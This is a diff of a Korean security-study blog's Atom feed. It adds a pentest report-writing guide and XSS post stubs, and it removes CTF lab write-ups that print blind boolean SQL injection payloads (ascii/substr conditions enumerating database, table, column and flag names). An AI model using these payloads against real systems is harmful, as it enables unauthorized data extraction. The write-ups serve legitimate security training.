@@ -1,6 +1,6 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.3">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2024-06-20T07:06:08+09:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">나의 코딩 공부</title><subtitle>ethan의 블로그</subtitle><author><name>ethan</name></author><entry><title type="html">XSS 취약점 찾기(1)</title><link href="http://localhost:4000/xss/XSS2/" rel="alternate" type="text/html" title="XSS 취약점 찾기(1)" /><published>2024-06-18T00:00:00+09:00</published><updated>2024-06-18T00:00:00+09:00</updated><id>http://localhost:4000/xss/XSS2</id><content type="html" xml:base="http://localhost:4000/xss/XSS2/"><![CDATA[<p><br /></p>
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.3">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2024-06-21T05:41:04+09:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">나의 코딩 공부</title><subtitle>ethan의 블로그</subtitle><author><name>ethan</name></author><entry><title type="html">XSS 이란(2)?</title><link href="http://localhost:4000/xss/XSS8/" rel="alternate" type="text/html" title="XSS 이란(2)?" /><published>2024-06-21T00:00:00+09:00</published><updated>2024-06-21T00:00:00+09:00</updated><id>http://localhost:4000/xss/XSS8</id><content type="html" xml:base="http://localhost:4000/xss/XSS8/"><![CDATA[<p><br /></p>
 
-<h1 id="1-xss-취약점-찾기1"><span style="background:#000000; color:#ffffff">1. XSS 취약점 찾기(1)</span></h1>
+<h1 id="1-xss2"><span style="background:#000000; color:#ffffff">1. XSS(2)</span></h1>
 
 <p><br /><span style="font-weight:bold; font-size:15px"> ※ 주의 사항 :</span></p>
 
@@ -10,35 +10,83 @@
 
 <p><br /></p>
 
-<h2 id="11-xss-1-문제-"><span style="background:#696969; color:#ffffff">1.1 XSS 1 문제 </span></h2>
+<h2 id="11-개요"><span style="background:#696969; color:#ffffff">1.1 개요 </span></h2>
 
 <p><br /></p>
 
-<p><img src="C:\Users\ljj01\OneDrive\바탕 화면\프로그램\ethanvolg.github.io\images\Untitled\image-20240618015745282.png" alt="image-20240618015745282" style="zoom:67%;" /></p>
+<p><br /></p>
 
-<p>게시판에 먼저 들어가서 글을 작성하여 어떻게 나타나는지 확인 하였다.</p>
+<h2 id="12-dom-based-xss"><span style="background:#696969; color:#ffffff">1.2 DOM Based XSS </span></h2>
 
-<p><img src="/images/2024-06-18-XSS2/image-20240618020616108.png" alt="image-20240618020616108" style="zoom:60%;" /></p>
+<p><br /></p>]]></content><author><name>ethan</name></author><category term="XSS" /><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">모의해킹 보고서 작성법</title><link href="http://localhost:4000/report/report/" rel="alternate" type="text/html" title="모의해킹 보고서 작성법" /><published>2024-06-21T00:00:00+09:00</published><updated>2024-06-21T00:00:00+09:00</updated><id>http://localhost:4000/report/report</id><content type="html" xml:base="http://localhost:4000/report/report/"><![CDATA[<p><br /></p>
 
-<p><img src="/images/2024-06-18-XSS2/image-20240618020310214.png" alt="image-20240618020310214" style="zoom:80%;" /></p>
+<h1 id="1-모의-해킹-보고서-작성법"><span style="background:#000000; color:#ffffff">1. 모의 해킹 보고서 작성법</span></h1>
 
-<p>제목, 본문 내용이 적은 대로 잘 작성되는지 확인이 가능했다.<br />
-따라서 stored xss 를 시도해 볼만 하다.</p>
+<p><br /></p>
 
-<p><img src="/images/2024-06-18-XSS2/image-20240618020654991.png" alt="image-20240618020654991" style="zoom:60%;" /></p>
+<h2 id="11-개요"><span style="background:#696969; color:#ffffff">1.1 개요 </span></h2>
 
-<p><img src="/images/2024-06-18-XSS2/image-20240618020439799.png" alt="image-20240618020439799" style="zoom:80%;" /></p>
+<p><br /></p>
 
-<p>사용 가능한 특수 문자를 체크 하기 위해 위와 같이 작성하였고, 본문이 아닌 제목에서는 잘 작성되는 것을 볼 수 있기 때문에<br />
-제목에 악성 스크립트를 작성할 수 있을 것 같다.</p>
+<blockquote>
+  <p><span style="font-weight:bold; font-size:18px">Microsoft word를 사용하는 이유</span></p>
+</blockquote>
 
-<p><img src="/images/2024-06-18-XSS2/image-20240618020541625.png" alt="image-20240618020541625" style="zoom:60%;" /></p>
+<p>보고서는 한글 프로그램 보다 Microsoft word를 이용하는 게 좋다.  한글 프로그램은 한글만 이용, 정부와 같이 문서 보안이 중요할 때는 사용하겠지만, Microsoft word가 파일 간 호환성이 더 뛰어나고, 다양한 기능과 언어를 지원하기 때문에 업무상 더 적합하다.</p>
 
-<p><img src="/images/2024-06-18-XSS2/image-20240618020741759.png" alt="image-20240618020741759" style="zoom:80%;" /></p>
+<blockquote>
+  <p><span style="font-weight:bold; font-size:18px">보고서를 이쁘게 작성해야 하는 이유</span></p>
+</blockquote>
 
-<p><img src="/images/2024-06-18-XSS2/image-20240618020757114.png" alt="image-20240618020757114" style="zoom: 50%;" /></p>
+<p>모의 해킹의 주된 목적은 보안 정도를 평가하고 관계자들에게 해당 보안 취약점을 인식시켜 필요한 조치를 취할 수 있도록 돕는 것이다. <br />
+그렇기 때문에 보고서의 전달력이 매우 중요하다.  대부분 관계자들은 비전공자이기 때문에 충분히 이해하기 쉽도록 상세히 작성해야 한다. <br />
+보고서가 길어짐에 따라 오랫동안  보기 편해야  하는 것이 당연하다.  따라서 이쁘게 쓴 보고서는  업무 능력을 좌우하므로 중요하다.</p>
 
-<p>스크립트를 작성해보니 잘 삽입되어, 나타나는 것을 확인할 수 있다.</p>]]></content><author><name>ethan</name></author><category term="XSS" /><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">XSS 취약점 찾기(6)</title><link href="http://localhost:4000/xss/XSS7/" rel="alternate" type="text/html" title="XSS 취약점 찾기(6)" /><published>2024-06-18T00:00:00+09:00</published><updated>2024-06-18T00:00:00+09:00</updated><id>http://localhost:4000/xss/XSS7</id><content type="html" xml:base="http://localhost:4000/xss/XSS7/"><![CDATA[<p><br /></p>
+<p><br /></p>
+
+<h2 id="12-표와-그림"><span style="background:#696969; color:#ffffff">1.2 표와 그림 </span></h2>
+
+<p><br /></p>
+
+<p>✅ <span style="font-weight:bold; font-size:18px">보기 좋은 표와 그림 형태</span></p>
+
+<ol>
+  <li>표와 그림 가로 크기 각각 동일하게 맞추기.</li>
+  <li>그림 테두리 적용해서 경계선 보이게 하기.</li>
+  <li>그림 안에 있는 글자와 본문에 있는 글자의 크기가 비슷하게 될 수 있도록 크기 맞추기.</li>
+  <li>공격 과정을 담기 위해 페이지 전체를 캡처해서 사용하기. (필요하다면, 크게 강조할 부분은 자르고 사용)</li>
+  <li>그림 되도록 많이 첨부해서 자세히 설명하기.</li>
+</ol>
+
+<p><br /></p>
+
+<h2 id="13-글"><span style="background:#696969; color:#ffffff">1.3 글 </span></h2>
+
+<p><br /></p>
+
+<p>✅ <span style="font-weight:bold; font-size:18px">전달력 좋은 글</span></p>
+
+<ol>
+  <li>
+    <p>말투는 상관 없지만 동일한 어투 사용하기.</p>
+  </li>
+  <li>
+    <p>그림과 해당 글의 간격을 좁혀서 설명하기.</p>
+  </li>
+  <li>
+    <p>사용된 해킹 공격에 대한 간단하게 설명하기.</p>
+  </li>
+  <li>
+    <p>발견된 취약점의 위치(url or 경로) 명시하기.</p>
+  </li>
+  <li>
+    <p>결과를 작성할 때 그림에 담긴 결과를 그대로 설명하기 보다는 해킹 피해자 측 피해 경로와 같이 설명하기.</p>
+
+    <p>예) alert(1) 발생! (X) ▶ 스크립트가 삽입된 게시글에 접근 시 의도한 임의의 스크립트가 실행되어, 클라이언트의 정보가 탈취 될 가능성이 있음</p>
+  </li>
+</ol>
+
+<p><br /></p>]]></content><author><name>ethan</name></author><category term="Report" /><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">XSS 취약점 찾기(6)</title><link href="http://localhost:4000/xss/XSS7/" rel="alternate" type="text/html" title="XSS 취약점 찾기(6)" /><published>2024-06-18T00:00:00+09:00</published><updated>2024-06-18T00:00:00+09:00</updated><id>http://localhost:4000/xss/XSS7</id><content type="html" xml:base="http://localhost:4000/xss/XSS7/"><![CDATA[<p><br /></p>
 
 <h1 id="1-xss-취약점-찾기6"><span style="background:#000000; color:#ffffff">1. XSS 취약점 찾기(6)</span></h1>
 
@@ -201,7 +249,47 @@
 
 <h2 id="11-xss-2-문제-"><span style="background:#696969; color:#ffffff">1.1 XSS 2 문제 </span></h2>
 
-<p><br /></p>]]></content><author><name>ethan</name></author><category term="XSS" /><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">XSS 이란?(1)</title><link href="http://localhost:4000/xss/XSS1/" rel="alternate" type="text/html" title="XSS 이란?(1)" /><published>2024-06-16T00:00:00+09:00</published><updated>2024-06-16T00:00:00+09:00</updated><id>http://localhost:4000/xss/XSS1</id><content type="html" xml:base="http://localhost:4000/xss/XSS1/"><![CDATA[<p><br /></p>
+<p><br /></p>]]></content><author><name>ethan</name></author><category term="XSS" /><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">XSS 취약점 찾기(1)</title><link href="http://localhost:4000/xss/XSS2/" rel="alternate" type="text/html" title="XSS 취약점 찾기(1)" /><published>2024-06-18T00:00:00+09:00</published><updated>2024-06-18T00:00:00+09:00</updated><id>http://localhost:4000/xss/XSS2</id><content type="html" xml:base="http://localhost:4000/xss/XSS2/"><![CDATA[<p><br /></p>
+
+<h1 id="1-xss-취약점-찾기1"><span style="background:#000000; color:#ffffff">1. XSS 취약점 찾기(1)</span></h1>
+
+<p><br /><span style="font-weight:bold; font-size:15px"> ※ 주의 사항 :</span></p>
+
+<p><span style="font-weight:bold; font-size:15px">1. 교육 목적으로만 이용 해주세요.</span><br />
+<span style="font-weight:bold; font-size:15px">2. 무단 침입, 데이터 유출, 개인 정보 침해 등 불법적인 활동은 심각한 법적 결과를 초래할 수 있습니다.</span><br />
+<span style="font-weight:bold; font-size:15px">3.  개인적인 테스트 환경을 구축해서 실습하시길 바랍니다. </span></p>
+
+<p><br /></p>
+
+<h2 id="11-xss-1-문제-"><span style="background:#696969; color:#ffffff">1.1 XSS 1 문제 </span></h2>
+
+<p><br /></p>
+
+<p><img src="C:\Users\ljj01\OneDrive\바탕 화면\프로그램\ethanvolg.github.io\images\Untitled\image-20240618015745282.png" alt="image-20240618015745282" style="zoom:67%;" /></p>
+
+<p>게시판에 먼저 들어가서 글을 작성하여 어떻게 나타나는지 확인 하였다.</p>
+
+<p><img src="/images/2024-06-18-XSS2/image-20240618020616108.png" alt="image-20240618020616108" style="zoom:60%;" /></p>
+
+<p><img src="/images/2024-06-18-XSS2/image-20240618020310214.png" alt="image-20240618020310214" style="zoom:80%;" /></p>
+
+<p>제목, 본문 내용이 적은 대로 잘 작성되는지 확인이 가능했다.<br />
+따라서 stored xss 를 시도해 볼만 하다.</p>
+
+<p><img src="/images/2024-06-18-XSS2/image-20240618020654991.png" alt="image-20240618020654991" style="zoom:60%;" /></p>
+
+<p><img src="/images/2024-06-18-XSS2/image-20240618020439799.png" alt="image-20240618020439799" style="zoom:80%;" /></p>
+
+<p>사용 가능한 특수 문자를 체크 하기 위해 위와 같이 작성하였고, 본문이 아닌 제목에서는 잘 작성되는 것을 볼 수 있기 때문에<br />
+제목에 악성 스크립트를 작성할 수 있을 것 같다.</p>
+
+<p><img src="/images/2024-06-18-XSS2/image-20240618020541625.png" alt="image-20240618020541625" style="zoom:60%;" /></p>
+
+<p><img src="/images/2024-06-18-XSS2/image-20240618020741759.png" alt="image-20240618020741759" style="zoom:80%;" /></p>
+
+<p><img src="/images/2024-06-18-XSS2/image-20240618020757114.png" alt="image-20240618020757114" style="zoom: 50%;" /></p>
+
+<p>스크립트를 작성해보니 잘 삽입되어, 나타나는 것을 확인할 수 있다.</p>]]></content><author><name>ethan</name></author><category term="XSS" /><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">XSS 이란(1)?</title><link href="http://localhost:4000/xss/XSS1/" rel="alternate" type="text/html" title="XSS 이란(1)?" /><published>2024-06-16T00:00:00+09:00</published><updated>2024-06-16T00:00:00+09:00</updated><id>http://localhost:4000/xss/XSS1</id><content type="html" xml:base="http://localhost:4000/xss/XSS1/"><![CDATA[<p><br /></p>
 
 <h1 id="1-xss1"><span style="background:#000000; color:#ffffff">1. XSS(1)</span></h1>
 
@@ -434,249 +522,5 @@ Reflected XSS (서버의 에코 기능 이용)</p>
 <p>1234’ and (select 1 union select 2 where (ascii(substr((select flag from flagHere limit 0,1),1,1))&gt;0)) and ‘1’=’1</p>
 
 <p><img src="/images/2024-06-09-SQLinjection28/image-20240612233800643.png" alt="image-20240612233800643" /></p>
-
-<p>segfault{~~}</p>]]></content><author><name>ethan</name></author><category term="SQL-injection" /><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">8 주차 SQL injection 데이터 추출 문제 풀이(3)</title><link href="http://localhost:4000/sql-injection/SQLinjection27/" rel="alternate" type="text/html" title="8 주차 SQL injection 데이터 추출 문제 풀이(3)" /><published>2024-06-09T00:00:00+09:00</published><updated>2024-06-09T00:00:00+09:00</updated><id>http://localhost:4000/sql-injection/SQLinjection27</id><content type="html" xml:base="http://localhost:4000/sql-injection/SQLinjection27/"><![CDATA[<p><br /></p>
-
-<h1 id="1-8-주차-sql-injection-데이터-추출-문제-풀이3"><span style="background:#000000; color:#ffffff">1. 8 주차 SQL injection 데이터 추출 문제 풀이(3)</span></h1>
-
-<p><br /><span style="font-weight:bold; font-size:15px"> ※ 주의 사항 :</span></p>
-
-<p><span style="font-weight:bold; font-size:15px">1. 교육 목적으로만 이용 해주세요.</span><br />
-<span style="font-weight:bold; font-size:15px">2. 무단 침입, 데이터 유출, 개인 정보 침해 등 불법적인 활동은 심각한 법적 결과를 초래할 수 있습니다.</span><br />
-<span style="font-weight:bold; font-size:15px">3.  개인적인 테스트 환경을 구축해서 실습하시길 바랍니다. </span></p>
-
-<p><br /></p>
-
-<h2 id="11-sqli-point-3-문제"><span style="background:#696969; color:#ffffff">1.1  SQLi Point 3 문제 </span></h2>
-
-<p><br /></p>
-
-<p><img src="/images/2024-06-09-SQLinjection27/image-20240612223253299.png" alt="image-20240612223253299" style="zoom:67%;" /></p>
-
-<p><br /></p>
-
-<h4 id="111-sql-injection-포인트-찾기"><span style="background:#A9A9A9; color:#ffffff">1.1.1 sql injection 포인트 찾기</span></h4>
-
-<hr />
-
-<p><br /></p>
-
-<p><img src="/images/2024-06-09-SQLinjection27/image-20240612223409408.png" alt="image-20240612223409408" /></p>
-
-<p><img src="/images/2024-06-09-SQLinjection27/image-20240612223453129.png" alt="image-20240612223453129" /></p>
-
-<p><img src="/images/2024-06-09-SQLinjection27/image-20240612223511724.png" alt="image-20240612223511724" /></p>
-
-<p><img src="/images/2024-06-09-SQLinjection27/image-20240612223529768.png" alt="image-20240612223529768" /></p>
-
-<p><img src="/images/2024-06-09-SQLinjection27/image-20240612224024682.png" alt="image-20240612224024682" /></p>
-
-<p><img src="/images/2024-06-09-SQLinjection27/image-20240612224042550.png" alt="image-20240612224042550" /></p>
-
-<p><br /></p>
-
-<h4 id="112--select-문구가-사용가능한-지-체크"><span style="background:#A9A9A9; color:#ffffff">1.1.2  select 문구가 사용가능한 지 체크</span></h4>
-
-<hr />
-
-<p><br /></p>
-
-<p><img src="/images/2024-06-09-SQLinjection27/image-20240612224146951.png" alt="image-20240612224146951" /></p>
-
-<p><img src="/images/2024-06-09-SQLinjection27/image-20240612224206340.png" alt="image-20240612224206340" /></p>
-
-<p><br /></p>
-
-<h4 id="113-공격-format-만들기"><span style="background:#A9A9A9; color:#ffffff">1.1.3 공격 format 만들기</span></h4>
-
-<hr />
-
-<p><br /></p>
-
-<p>case when (ascii(substr((select ~~),1,1))&gt;0) then 1 else (select 1 union select 2) end</p>
-
-<p><br /></p>
-
-<h4 id="114-db이름-확인하기"><span style="background:#A9A9A9; color:#ffffff">1.1.4 DB이름 확인하기</span></h4>
-
-<hr />
-
-<p><br /></p>
-
-<p>case when (ascii(substr((select database() limit 0,1),1,1))&gt;0) then 1 else (select 1 union select 2) end</p>
-
-<p><img src="/images/2024-06-09-SQLinjection27/image-20240612225209697.png" alt="image-20240612225209697" /></p>
-
-<p>sqli_8</p>
-
-<p><br /></p>
-
-<h4 id="115-table이름-확인하기"><span style="background:#A9A9A9; color:#ffffff">1.1.5 table이름 확인하기</span></h4>
-
-<hr />
-
-<p><br /></p>
-
-<p>select table_name from information_schema.tables where table_schema=’sqli_8’ limit 0,1</p>
-
-<p>case when (ascii(substr((select table_name from information_schema.tables where table_schema=’sqli_8’ limit 0,1),1,1))&gt;0) then 1 else (select 1 union select 2) end</p>
-
-<p><img src="/images/2024-06-09-SQLinjection27/image-20240612225349319.png" alt="image-20240612225349319" /></p>
-
-<p>flag_Table</p>
-
-<p><br /></p>
-
-<h4 id="116-column-이름-확인하기"><span style="background:#A9A9A9; color:#ffffff">1.1.6 column 이름 확인하기</span></h4>
-
-<hr />
-
-<p><br /></p>
-
-<p>select column_name from information_schema.columns where table_name=’flag_Table’ limit 0,1</p>
-
-<p>case when (ascii(substr((select column_name from information_schema.columns where table_name=’flag_Table’ limit 0,1),1,1))&gt;0) then 1 else (select 1 union select 2) end</p>
-
-<p><img src="/images/2024-06-09-SQLinjection27/image-20240612225624384.png" alt="image-20240612225624384" /></p>
-
-<p>flagData</p>
-
-<p><br /></p>
-
-<h4 id="117-data-추출하기"><span style="background:#A9A9A9; color:#ffffff">1.1.7 data 추출하기</span></h4>
-
-<hr />
-
-<p><br /></p>
-
-<p>select flagData from flag_Table limit 0,1</p>
-
-<p>case when (ascii(substr((select flagData from flag_Table limit 0,1 ),1,1))&gt;0) then 1 else (select 1 union select 2) end</p>
-
-<p><img src="/images/2024-06-09-SQLinjection27/image-20240612230009887.png" alt="image-20240612230009887" /></p>
-
-<p>segfault{~~}</p>]]></content><author><name>ethan</name></author><category term="SQL-injection" /><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">8 주차 SQL injection 데이터 추출 문제 풀이(2)</title><link href="http://localhost:4000/sql-injection/SQLinjection26/" rel="alternate" type="text/html" title="8 주차 SQL injection 데이터 추출 문제 풀이(2)" /><published>2024-06-09T00:00:00+09:00</published><updated>2024-06-09T00:00:00+09:00</updated><id>http://localhost:4000/sql-injection/SQLinjection26</id><content type="html" xml:base="http://localhost:4000/sql-injection/SQLinjection26/"><![CDATA[<p><br /></p>
-
-<h1 id="1-8-주차-sql-injection-데이터-추출-문제-풀이2"><span style="background:#000000; color:#ffffff">1. 8 주차 SQL injection 데이터 추출 문제 풀이(2)</span></h1>
-
-<p><br /><span style="font-weight:bold; font-size:15px"> ※ 주의 사항 :</span></p>
-
-<p><span style="font-weight:bold; font-size:15px">1. 교육 목적으로만 이용 해주세요.</span><br />
-<span style="font-weight:bold; font-size:15px">2. 무단 침입, 데이터 유출, 개인 정보 침해 등 불법적인 활동은 심각한 법적 결과를 초래할 수 있습니다.</span><br />
-<span style="font-weight:bold; font-size:15px">3.  개인적인 테스트 환경을 구축해서 실습하시길 바랍니다. </span></p>
-
-<p><br /></p>
-
-<h2 id="11-sqli-point-2-문제"><span style="background:#696969; color:#ffffff">1.1  SQLi Point 2 문제 </span></h2>
-
-<p><br /></p>
-
-<p><img src="/images/2024-06-09-SQLinjection26/image-20240612204234463.png" alt="image-20240612204234463" style="zoom:67%;" /></p>
-
-<p><br /></p>
-
-<h4 id="111-sql-injection-포인트-찾기"><span style="background:#A9A9A9; color:#ffffff">1.1.1 sql injection 포인트 찾기</span></h4>
-
-<hr />
-
-<p><br /></p>
-
-<p>마이페이지와 게시판이 존재합니다.</p>
-
-<p><img src="/images/2024-06-09-SQLinjection26/image-20240612204423453.png" alt="image-20240612204423453" style="zoom: 67%;" /></p>
-
-<p><img src="/images/2024-06-09-SQLinjection26/image-20240612204359138.png" alt="image-20240612204359138" style="zoom:67%;" /></p>
-
-<p><img src="/images/2024-06-09-SQLinjection26/image-20240612204614693.png" alt="image-20240612204614693" /></p>
-
-<p><img src="/images/2024-06-09-SQLinjection26/image-20240612205028717.png" alt="image-20240612205028717" /></p>
-
-<p><img src="/images/2024-06-09-SQLinjection26/image-20240612205055104.png" alt="image-20240612205055104" /></p>
-
-<p><br /></p>
-
-<h4 id="112--select-문구가-사용가능한-지-체크"><span style="background:#A9A9A9; color:#ffffff">1.1.2  select 문구가 사용가능한 지 체크</span></h4>
-
-<hr />
-
-<p><br /></p>
-
-<p><img src="/images/2024-06-09-SQLinjection26/image-20240612205154382.png" alt="image-20240612205154382" style="zoom:67%;" /></p>
-
-<p><img src="/images/2024-06-09-SQLinjection26/image-20240612205214639.png" alt="image-20240612205214639" /></p>
-
-<p><br /></p>
-
-<h4 id="113-공격-format-만들기"><span style="background:#A9A9A9; color:#ffffff">1.1.3 공격 format 만들기</span></h4>
-
-<hr />
-
-<p><br /></p>
-
-<p>(ascii(substr((select ~~),1,1))&gt;0) and username</p>
-
-<p><br /></p>
-
-<h4 id="114-db이름-확인하기"><span style="background:#A9A9A9; color:#ffffff">1.1.4 DB이름 확인하기</span></h4>
-
-<hr />
-
-<p><br /></p>
-
-<p>(ascii(substr((select database() limit 0,1),1,1))&gt;0) and username</p>
-
-<p><img src="/images/2024-06-09-SQLinjection26/image-20240612205441694.png" alt="image-20240612205441694" /></p>
-
-<p>sqli_7</p>
-
-<p><br /></p>
-
-<h4 id="115-table이름-확인하기"><span style="background:#A9A9A9; color:#ffffff">1.1.5 table이름 확인하기</span></h4>
-
-<hr />
-
-<p><br /></p>
-
-<p>select table_name from information_schema.tables where table_schema=’sqli_7’ limit 0,1</p>
-
-<p>(ascii(substr((select table_name from information_schema.tables where table_schema=’sqli_7’ limit 0,1),1,1))&gt;0) and username</p>
-
-<p><img src="/images/2024-06-09-SQLinjection26/image-20240612205643107.png" alt="image-20240612205643107" /></p>
-
-<p>flagTable</p>
-
-<p><br /></p>
-
-<h4 id="116-column-이름-확인하기"><span style="background:#A9A9A9; color:#ffffff">1.1.6 column 이름 확인하기</span></h4>
-
-<hr />
-
-<p><br /></p>
-
-<p>select column_name from information_schema.columns where table_name=’flagTable’ limit 0,1</p>
-
-<p>(ascii(substr((select column_name from information_schema.columns where table_name=’flagTable’ limit 0,1),1,1))&gt;0) and username</p>
-
-<p><img src="/images/2024-06-09-SQLinjection26/image-20240612205852379.png" alt="image-20240612205852379" /></p>
-
-<p>flag</p>
-
-<p><br /></p>
-
-<h4 id="117-data-추출하기"><span style="background:#A9A9A9; color:#ffffff">1.1.7 data 추출하기</span></h4>
-
-<hr />
-
-<p><br /></p>
-
-<p>select flag from flagTable limit 0,1</p>
-
-<p>(ascii(substr((select flag from flagTable limit 0,1),1,1)&gt;0) and username</p>
-
-<p>f~~</p>
-
-<p>w~~</p>
-
-<p><img src="/images/2024-06-09-SQLinjection26/image-20240612223150754.png" alt="image-20240612223150754" /></p>
 
 <p>segfault{~~}</p>]]></content><author><name>ethan</name></author><category term="SQL-injection" /><summary type="html"><![CDATA[]]></summary></entry></feed>
